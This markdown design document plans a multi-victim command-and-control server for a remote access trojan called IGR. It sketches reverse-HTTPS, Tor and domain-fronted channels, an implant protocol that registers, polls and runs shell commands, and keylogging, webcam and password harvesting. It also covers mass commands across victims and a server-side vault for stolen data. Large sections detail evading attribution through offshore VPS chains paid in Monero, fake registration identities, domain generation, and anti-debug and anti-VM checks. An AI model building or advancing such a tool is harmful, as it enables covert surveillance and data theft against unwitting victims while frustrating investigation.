# IGR v2 Architecture — Central C2 Server Model

## Current Problem
- Each victim runs its own Cloudflared tunnel → attacker gets a unique URL per victim
- No central view of all victims
- Cloudflared binary must be downloaded on each victim (noisy, ~15MB)
- If victim is behind strict NAT/firewall, tunnel can fail
- Attacker must bookmark/manage multiple URLs

## Proposed: Central C2 Server

### Overview
Victim implant **connects outbound** to your always-on home server. No inbound tunnel needed. You run one web dashboard on your server that shows ALL connected victims.

---

## Architecture Options

### Option A: Reverse HTTP/WS (RECOMMENDED)
```
[Victim] --long-poll/websocket--> [Your Home Server] <--browser-- [You]
```
- Victim initiates outbound connection (bypasses NAT/firewall)
- Your server runs the dashboard + relay
- Communication over HTTPS (looks like normal web traffic)
- **Pros**: Simple, reliable, one server, real-time
- **Cons**: Server IP is a single point of failure (can be seized)

### Option B: Reverse HTTP via Tor Hidden Service
```
[Victim] --Tor--> [Your .onion C2] <--Tor-- [You]
```
- C2 server runs as Tor hidden service
- Victim connects through Tor (3-hop circuit)
- You access dashboard via Tor browser
- **Pros**: Near-impossible to trace back to your physical location
- **Cons**: High latency (~2-5s), requires Tor on victim, slower streams

### Option C: Domain-Fronted CDN Relay
```
[Victim] --HTTPS--> [CDN (Cloudflare/Azure)] --forward--> [Your Origin Server]
```
- Victim connects to a legit CDN domain (e.g. cdn.microsoft.com)
- CDN forwards to your origin based on SNI/domain header
- Domain fronting hides true destination
- **Pros**: Very hard to block/trace, looks like legit CDN traffic
- **Cons**: Major CDNs are killing domain fronting, fragile

### Option D: Hybrid (Tor + Fallback HTTP)
```
[Victim] --try Tor--> [.onion C2]
         --fallback--> [HTTPS C2 via VPS]
```
- Try Tor first for anonymity
- Fall back to direct HTTPS if Tor unavailable
- **Pros**: Best of both worlds
- **Cons**: More complex implant

---

## RECOMMENDED: Option A + Hardening

### Server Side (your home server)
- **Python Flask/FastAPI** — same style as current IGR
- **Dashboard**: Multi-victim view with tabs/cards per victim
- **WebSocket** for real-time streaming (screen, webcam)
- **SQLite** for victim registry, keylogs, harvested data
- **Authentication**: Password + optional TOTP

### Implant Side (victim)
- **Outbound HTTPS long-poll** to your server
- **No Cloudflared needed** — just `requests`/`urllib`
- **Heartbeat** every 30s with system info
- **Command queue** — server pushes commands, implant pulls
- **Chunked upload** for large files (keylogs, screenshots)

### Anti-Trace Hardening (CRITICAL)

#### Layer 1: Server Identity Protection
- Run C2 behind a **VPS** (not directly from home)
  - Rent offshore VPS (Romania, Netherlands, Panama)
  - Pay with crypto (XMR preferred)
  - Use fake identity for registration
- **NEVER** expose home IP — always proxy through VPS chain
- Use **WireGuard tunnel** from home → VPS → C2 traffic

#### Layer 2: Domain & TLS
- Register domain with **crypto + fake ID** (Njall, OrangeWebsite)
- Use **Let's Encrypt** or self-signed with custom CA
- Domain looks innocuous: `update-service[.]net`, `cdn-analytics[.]com`

#### Layer 3: Traffic Obfuscation
- Implant traffic mimics **legitimate HTTPS** patterns
- User-Agent matches Chrome/Firefox
- Request intervals randomized (jitter)
- Data encoded as **base64 in JSON** (looks like API calls)
- Optional: **Steganographic** mode — hide data in image uploads

#### Layer 4: Implant Forensics Resistance
- **No hardcoded IPs/domains** — resolve via DGAs or encrypted config
- Config encrypted with **AES-256** (key derived from build-time secret)
- **In-memory execution** where possible (no disk writes)
- **Anti-debug**: `IsDebuggerPresent`, `NtQueryInformationProcess`
- **Anti-VM**: check MAC prefixes, CPUID, registry keys
- **Wipe artifacts** on panic (same as current)

#### Layer 5: Network-Level Anonymity
- **WireGuard chain**: Home → VPS1 (NL) → VPS2 (RO) → C2
- Each hop only knows the next hop
- Even if victim's network is monitored, they see HTTPS to VPS IP
- Even if VPS is seized, they see traffic from another VPS, not your home

---

## Server Dashboard Design

### Multi-Victim View
```
+---------------------------+
| IGR C2  | 3 Online / 1 Offline
+---------------------------+
| [Victim-PC01] 🟢 2m ago  |
|   Windows 11 | 192.168.1.5
|   [Screen] [Shell] [Files]
|                           |
| [Victim-PC02] 🟢 30s ago |
|   Windows 10 | 10.0.0.12
|   [Screen] [Shell] [Files]
|                           |
| [Victim-PC03] 🔴 4h ago  |
|   Windows 11 | Last: 172.x
+---------------------------+
```

### Per-Victim Features (same as current)
- Screen stream, webcam, control, keylogger
- File browser, shell, troll actions
- Harvest (passwords, history, WiFi, etc.)
- System info, processes, persistence

### New C2-Specific Features
- **Mass commands**: broadcast shell command to all victims
- **Auto-task**: schedule recurring actions (screenshot every 5min)
- **Data vault**: all harvested data stored server-side in SQLite
- **Export**: download all victim data as ZIP
- **Victim tagging**: label victims (work, home, target-A)
- **Activity timeline**: log of all actions per victim

---

## Implant → Server Protocol

### Registration (first connect)
```
POST /api/v1/register
Body: { "pc_id": "unique-hash", "hostname": "DESKTOP-ABC",
        "os": "Windows 11", "user": "john", "ip": "192.168.1.5" }
Response: { "session_token": "abc123", "interval": 30 }
```

### Heartbeat (every 30s)
```
POST /api/v1/heartbeat
Headers: Authorization: Bearer <session_token>
Body: { "uptime": 3600, "active_window": "Chrome" }
Response: { "commands": [ {"id":1, "type":"screenshot"}, {"id":2, "type":"shell","cmd":"whoami"} ] }
```

### Command Result
```
POST /api/v1/result/<command_id>
Body: { "data": "base64...", "status": "ok" }
```

### Streaming (screen/webcam)
```
GET /api/v1/stream/<session_token>
WebSocket or chunked HTTP for frame relay
```

---

## File Structure (New Project)

```
igr-c2/
├── server.py          # C2 server (Flask/FastAPI)
├── implant.py         # Victim-side agent (single file, builds to .exe)
├── builder.py         # Build script: config injection, PyInstaller
├── config.txt         # Server URL, auth keys, encryption key
├── requirements.txt   # Server dependencies
├── database.py        # SQLite models for victim registry
└── static/            # Dashboard CSS/JS (or embedded)
```

---

## Migration Path from Current IGR

1. **Keep current IGR as-is** — it works for single-victim Cloudflared mode
2. **Build IGR-C2 as separate project** — new repo, new architecture
3. **Implant reuses most code** from current `main.py` (harvest, troll, stealth functions)
4. **Replace Cloudflared+Flask-server** with outbound-polling client
5. **Server is new code** — multi-victim dashboard + command queue

### Quick Win: Minimal C2 (can be done in ~500 lines)
- Server: Flask + SQLite, one `/register`, one `/heartbeat`, one `/result`
- Implant: Strip Flask from main.py, replace with polling loop
- Dashboard: Simple HTML table of victims, click to open control panel
- No WebSocket needed — long-poll works fine for most features

---

## Priority: What to Build First

1. **Server with victim registry + heartbeat** (core loop)
2. **Implant outbound connector** (replace Cloudflared)
3. **Dashboard multi-victim view** (see all victims)
4. **Command queue** (push commands to specific victim)
5. **Screen/shell relay** (stream through server)
6. **Anti-trace hardening** (VPS chain, encryption, obfuscation)
7. **Advanced features** (mass commands, auto-tasks, data vault)
